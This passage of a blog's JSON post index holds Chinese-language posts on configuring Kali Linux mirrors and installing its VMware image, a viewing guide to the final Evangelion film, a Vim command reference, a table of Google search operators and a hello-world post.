http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free #浙大 deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free #东软大学 deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib deb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib #南京大学 deb https://mirrors.nju.edu.cn/kali kali-rolling main non-free contrib deb-src https://mirrors.nju.edu.cn/kali kali-rolling main non-free contrib 添加并保存后需要到终端中更新\n1 sudo apt upgrade 注意：部分情况可能报错\n1 2 W: GPG 错误：http://mirrors.ustc.edu.cn/kali kali-rolling InRelease: 下列签名无效： EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository \u0026lt;devel@kali.org\u0026gt; E: 仓库 “http://mirrors.ustc.edu.cn/kali kali-rolling InRelease” 没有数字签名。 要解决这个问题，你需要下载并安装正确的GPG签名：\n1 2 wget archive.kali.org/archive-key.asc apt-key add archive-key.asc 然后再更新软件包列表即可\n调整文字大小（可选） 注意：这里我们去设置里在dpi选项中调整，而不要去“display”选项中调整，因为效果很差\n","date":"2025-10-27T18:27:38+08:00","image":"https://www.retr0.xyz/post/kali%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1/kali2.webp","permalink":"https://www.retr0.xyz/p/1.2kali%E7%9A%84%E6%9C%AC%E5%9C%B0%E5%8C%96%E9%85%8D%E7%BD%AE%E6%9B%B4%E9%80%82%E5%90%88%E4%B8%AD%E5%9B%BD%E5%AE%9D%E5%AE%9D%E7%9A%84kali/","title":"1.2Kali的本地化配置：更适合中国宝宝的Kali"},{"content":"遲到的補完：《終》觀影指南 2025年10月31日，《天鹰战士：最后的冲击》将登录大陆内各影院，但我们仍用《新·福音战士剧场版：终》来称呼它，或者更简单的《终》也可以。\n然而上文表述都是不准确的，它真正的名字《シン・エヴァンゲリオン劇場版𝄇》（这么多片假名谁看得懂啊）里并没有“终”或者“最后”的字样，只有一个音乐符号**𝄇——它是乐谱中的段落终止线，表示一个完整段落的结束**。其副标题Thrice upon a time出自同名科幻小说，后者同时也是《命运石之门》的原型。\n即使你没看过EVA，也可能晓得EVA很难看懂，甚至形成了专门的学问叫“E学”。不过笔者在此只提供EVA的基本认识和一套简单易懂的世界观，希望对各位提供些许帮助。\n你所必须知道的… 许多年前，“第一先祖种族”FAR（就是牛逼外星人）生活在银河系内。它们在灭亡之前制造了名为“月亮”的运输船，月亮可以通过颜色来区分，比如在地球上空的白月，称为“白之月”。运输船运输的是生命之种、朗基努斯之枪、死海文书。\n它们仨分别是用来产生生命的（白之月的“亚当”产生“使徒”，黑之月的“莉莉丝”产生地球生物）、前者的开关（为了生物多样性，FAR要求一个星球上只允许一颗生命之种起作用）和前两者的使用说明书。\n40亿年前，白之月降落到南极区域，亚当繁衍“使徒”，使徒拥有生命之果，所以体型巨大而且难杀；之后，黑之月也来了，出于未知的原因，黑之月中的朗枪没有抑制莉莉丝，于是莉莉丝产生生命，人类拥有智慧之果，能造EVA去干使徒。亚当这边则受委屈了，白之月携带的朗基努斯之枪抑制了它产生生命。\n1947年，掌控人类的组织Seele（“灵魂”的德语）发现了死海文书，相信这是“神明”的启示，他们就要执行上面的计划（这就是EVA宗教色彩的来源，但EVA从任何角度上都不应当被定义为“宗教动漫”）。\n1999年，人类在南极发现了白之月撞击地球时产生了巨大坑洞，并在其内部发现了亚当，称为“第一使徒”。为了验证死海古书上的内容，人类进行了一些实验，导致南极的亚当发生了暴走，其释放出的能量对地球造成了不小的影响，所以EVA可以说是末世作品。\n2003年，人类在日本发现了巨大的地洞，也就是黑之月，Seele的下属机构NERV（“神经”的英语）的总部就建在其中，表面上是为了对抗使徒，实际是为了执行Seele的人类补完计划（就是全人类共同进化呗，灵魂脱离橙汁组成的肉体，合为一个整体，地球球长总喜欢搞这种）。\nNERV通过克隆亚当和莉莉丝的细胞制作了“终极泛用人型决战兵器，人造人EVANGELION”来打败使徒，由此可知，EVA并不是机甲番。\n政策的制定者Seele、政策的执行者NERV、在战斗一线的少年少女们——EVA的故事就是他们三者之间以及内部的矛盾。\n𝄇之前，发生了什么？ 我们不得不承认，如果《终》是你接触的第一步EVA作品，那诸位在电影院基本上也就是看个热闹，别说看懂EVA的内核、导演庵野秀明的表达、主角的愿景，最基本的这几个人在干什么都会搞不明白，所以介绍这部电影之前发生了什么，是很有必要的。\n旧EVA（26集TV+两部剧场版）我们不再讲了，只需要知道在旧剧场版的最后，人类补完计划没有得到完美执行，世界进行了一次轮回而进入到新EVA的故事即可。\n《终》之前有三部剧场版《序》《破》《Q》，我们简要说一说各个人物的动机和行为，相信这会对各位看明白《终》起到一定帮助。\n执行人类补完计划的势力NERV：碇源堂和冬月教授。碇源堂争取到了Seele老登们的信任，他希望主导人类补完计划，从而在人与人完全没有隔阂的世界中和老婆团聚；冬月教授则是他的得力助手。\n反对NERV的Wille（意为意志）：美里小姐、律子博士及其他机组人员。美里小姐的爱人良治在Wille起义时牺牲，继承了爱人意志的她一方面要阻止真嗣再一次不小心毁灭地球，另一方面又要阻止碇司令的疯狂计划，她能够成功吗；律子博士是她的得力助手。\nEVA驾驶员：碇真嗣、明日香、绫波丽、真希波。碇真嗣先是在《序》《破》中被老爹骗去帮忙执行计划，而后又在《Q》中和薰一起进他爹圈套，在《终》里他还能拯救世界吗；明日香在之前的作战中成为了半使徒半生物的存在，迷茫的她就要全力帮助美里小姐，等会，她会不会是克隆人；至少我们确定绫波丽是克隆人，是碇源堂妻子的克隆，《序》《破》中出现了白衣服的绫波丽（白丽），她对真嗣觉醒了感情，也就是“爱他”，却连同初号机被封印了，《Q》《终》出现的黑丽是否会觉醒“爱我”呢；真希波，她对世界真相的认识似乎比Seele还要多，我们不知道她为什么会帮助真嗣，但事实就是这样。\n生活在第三村的人们：真嗣以前的同班同学们，在《Q》中差点毁灭世界的他，需要一些友人们的帮助呢……\n总而言之，神秘兮兮的那群人干神神鬼鬼的事情本质上都是“碇司令为了见老婆，在举办神明的高科技仪式”，其他人则都是来阻止他的，阻止的方式就是开生物高达嗯打。\n万一，你喜欢上了EVA？ 在观影之后，各位或许会对EVA产生了更多的兴趣，或许也想要和笔者一样对“E学”进行一些学习和研究。对此，笔者的回答是：\n正如《终》里的台词“再见是希望彼此再见时说的话”，各位读者朋友们，\n再见。\n​ 終劇\n","date":"2025-10-27T18:27:38+08:00","image":"https://www.retr0.xyz/post/%E5%BD%B1%E8%A7%86/%E5%9B%BE%E7%89%871.png","permalink":"https://www.retr0.xyz/p/%E9%81%B2%E5%88%B0%E7%9A%84%E8%A3%9C%E5%AE%8C%E7%B5%82%E8%A7%80%E5%BD%B1%E6%8C%87%E5%8D%97/","title":"遲到的補完：《終》觀影指南"},{"content":"1. 下载kali 几种可选方案：\n官网下载：Get Kali | Kali Linux选择VMware下载即可（不推荐）\n镜像源下载：阿里云镜像源kali-images安装包下载_开源镜像站-阿里云\n​ 清华镜像源清华大学开源软件镜像站 | Tsinghua Open Source Mirror\n​ 中科大镜像源Index of /kali-images/\n以上几个都是从最新版本中找到后缀为vmware-amd64.7z的下载即可\n2. 安装kali 将下载好的压缩包解压在某文件夹内\n然后打开VMware Workstation Pro点击主页上的【打开虚拟机】\n选择你刚刚解压出的那一堆文件中后缀为vmx的文件即可（一般会自动筛选的）\n3. 登录kali 默认超级用户名和密码均为kali，\n至此，\n享受你的个人kali吧。\n","date":"2025-10-27T12:46:38+08:00","image":"https://www.retr0.xyz/post/kali%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1/kali.jpeg","permalink":"https://www.retr0.xyz/p/1.1kali%E7%9A%84%E4%B8%8B%E8%BD%BD%E4%B8%8E%E5%AE%89%E8%A3%85/","title":"1.1Kali的下载与安装"},{"content":"一、Vim 基本操作 1. 启动和退出 Vim 启动 Vim:\n1 vim filename 退出 Vim:\n正常退出并保存：:wq 或 ZZ\n仅退出（不保存）：:q\n强制退出（不保存）：:q!\n仅保存文件：:w\n2. 模式切换 Vim 有多种模式，最常用的是以下几种：\n正常模式（Normal Mode）：Vim 启动时默认的模式，可以执行各种命令，如移动光标、删除文本等。按 Esc 键进入。\n插入模式（Insert Mode）：可以输入文本。按 i 进入，按 Esc 返回正常模式。\n可视模式（Visual Mode）：用于选中文本块。按 v 进入，可视模式下可使用方向键选择文本。\n常用模式切换命令：\ni：进入插入模式，在当前光标位置前插入。\na：进入插入模式，在当前光标位置后插入。\no：在当前行下方打开新行并进入插入模式。\nv：进入可视模式。\nV：进入可视行模式（选中整行）。\nCtrl + v：进入可视块模式（列选择）。\n二、Vim 光标移动命令 1. 基本移动 h：向左移动一个字符。\nl：向右移动一个字符。\nj：向下移动一行。\nk：向上移动一行。\n2. 行内移动 0：移动到行首。\n^：移动到本行第一个非空白字符。\n$：移动到行尾。\n3. 单词移动 w：移动到下一个单词的开头。\ne：移动到当前或下一个单词的末尾。\nb：移动到上一个单词的开头。\n4. 页面移动 Ctrl + u：向上滚动半页。\nCtrl + d：向下滚动半页。\nCtrl + b：向上滚动一整页。\nCtrl + f：向下滚动一整页。\nG：移动到文件末尾。\ngg：移动到文件开头。\n5. 行跳转 :n：跳转到第 n 行。\nnG：跳转到第 n 行。\n三、Vim 文本编辑命令 1. 插入和删除 i：进入插入模式。\na：在当前光标后插入文本。\no：在当前行下方新开一行并进入插入模式。\ndd：删除当前行。\nD：删除当前光标到行尾的所有内容。\nx：删除当前光标所在的字符。\ndw：删除当前光标到单词末尾的内容。\nu：撤销上一步操作。\nCtrl + r：重做上一步撤销的操作。\n2. 复制、剪切与粘贴 yy：复制当前行。\nyw：复制一个单词。\np：粘贴到光标后。\nP：粘贴到光标前。\ndd：剪切当前行。\ndaw：剪切一个单词。\n3. 替换与修改 r：替换当前字符。\nR：进入替换模式，从光标开始的字符将被逐个替换，直到退出替换模式为止。\ncw：修改当前单词（删除当前单词并进入插入模式）。\nc$：修改从光标位置到行尾的内容。\n四、Vim 查找与替换命令 1. 查找 /pattern：向下查找 pattern（正则表达式）。\n?pattern：向上查找 pattern。\nn：在查找模式下，查找下一个匹配项。\nN：在查找模式下，查找上一个匹配项。\n*：查找光标所在单词的下一个匹配项。\n#：查找光标所在单词的上一个匹配项。\n2. 替换 :s/old/new：替换当前行的第一个匹配的 old 为 new。\n:s/old/new/g：替换当前行的所有 old 为 new。\n:%s/old/new/g：替换整个文件中的所有 old 为 new。\n:%s/old/new/gc：替换整个文件中的所有 old 为 new，每次替换前提示确认。\n五、Vim 多窗口与多文件操作 1. 多窗口操作 :split 或 :sp：水平分割窗口。\n:vsplit 或 :vsp：垂直分割窗口。\nCtrl + w, w：在分割窗口之间切换。\nCtrl + w, h/j/k/l：分别向左、下、上、右切换窗口。\n:q：关闭当前窗口。\n2. 多文件操作 :e filename：打开指定文件。\n:bnext 或 :bn：切换到下一个缓冲区（文件）。\n:bprev 或 :bp：切换到上一个缓冲区（文件）。\n:ls：列出所有缓冲区（打开的文件）。\n:bN：切换到缓冲区 N。\n","date":"2025-10-27T09:27:38+08:00","image":"https://www.retr0.xyz/post/kali%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1/vim.webp","permalink":"https://www.retr0.xyz/p/vim%E7%9A%84%E4%BD%BF%E7%94%A8/","title":"Vim的使用"},{"content":" 指令 用法 示例 \u0026quot;\u0026quot;(引号) 用引号来查询一个确切的单词或短语 查找有关《百年孤独》这本书的网页，语法：\u0026ldquo;百年孤独\u0026rdquo; OR(或者) 用OR分隔搜索词，同时执行两个搜索查询，这将找到包含多个单词之一的页面。 搜索引用了“Google Drive”、“Dropbox”或“OneDrive”的页面，语法：Google Drive OR Dropbox OR OneDrive -(减号、连字符) 在单词或网站前使用连字符将其从搜索结果中排除 从搜索结果中排除维基百科页面，语法：- site:http://wikipedia.org allintext: 使用allintext:[搜索短语]查找正文中包含这些单词的页面 查找正文中有关Roth、IRA投资讯息的页面，语法：allintext:Roth IRA 投资 allintitle: 使用allintitle:[搜索短语]查找标题中包含这些单词的页面 查找标题中同时包含“Apple”和“notebook”的页面，语法：allintitle:Apple notebook allinurl: 使用allinurl:[搜索短语]查找URL中包含这些单词的页面 查找URL中同时包含”Microsoft” and “Surface”的页面，语法：allinurl:Microsoft Surface site: 使用site:[URL]将搜索结果限制到特定网站 查找云点SEO网关于谷歌SEO的页面，语法：site:http://yundianseo.com 谷歌SEO ~(波浪号) 使用波浪号获得目标关键词及其近似词的搜索结果 查找SEO方面的策略或者教程，语法：SEO ~教程 related: 使用related:[URL]查找与特定网站类似的网站 查找与云点SEO类似的网站，语法：related:http://yundianseo.com define: 使用define:[搜索短语]查找其定义 查找SEO的定义，语法：define:SEO $ 使用$查找特定价格的商品 查找一款售价在99美金的手机，语法：mobile phone $99 location: 使用location:[地点]查看某个地区内的相关信息 查询南京的酒店，语法：hotel location:Nanjing *（星号） 添加星号作为未知单词或事实的占位符 查找以“生活就像一个”开头的引语，语法：生活就像一个* filetype: 使用filetype:[后缀]将结果限制为特定的文件格式，如PDF或DOC。 查找PDF格式的Microsoft Office键盘快捷键相关文件，语法：filetype:pdf Microsoft Office键盘快捷键 ..（两点） 用两个句点分隔数字，不带空格，以搜索该范围内的数字 查找1950年至2000年间发生的计算机里程碑，语法：”计算机里程碑” 1950..2000 AROUND(n) 在两个搜索词之间加上AROUND(n)，以查找两个词间有特定距离的页面。用数字n设置术语之间的最大距离，这对于查找两个搜索词之间的关系很有用。 查找在同一句话或段落中提到Facebook和Microsoft的页面，语法：Facebook AROUND(7) Microsoft ","date":"2025-10-27T09:27:38+08:00","permalink":"https://www.retr0.xyz/p/%E8%B0%B7%E6%AD%8C%E6%90%9C%E7%B4%A2%E8%AF%AD%E6%B3%95/","title":"谷歌搜索语法"},{"content":"Hello World! 如果你能看到这篇文章，说明我的博客已经正常开通。\n总之，\n欢迎订阅！\n","date":"2025-10-26T23:13:26+08:00","permalink":"https://www.retr0.xyz/p/hello_world/","title":"Hello_world"}]